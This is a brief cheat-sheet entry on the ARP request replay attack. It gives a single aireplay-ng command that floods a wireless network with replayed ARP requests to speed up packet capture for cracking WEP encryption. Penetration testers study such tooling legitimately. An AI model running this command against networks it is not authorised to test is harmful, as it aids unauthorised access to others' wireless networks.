# ARP Request Replay Attack

This attack generates more traffic on the network by replaying ARP requests, speeding up the process of capturing packets for WEP cracking.

## Commands

#### 1) Replay ARP requests

    aireplay-ng -3 -b BSSID -h MAC wlan0mon

You increase network traffic to quickly capture enough packets for cracking WEP.
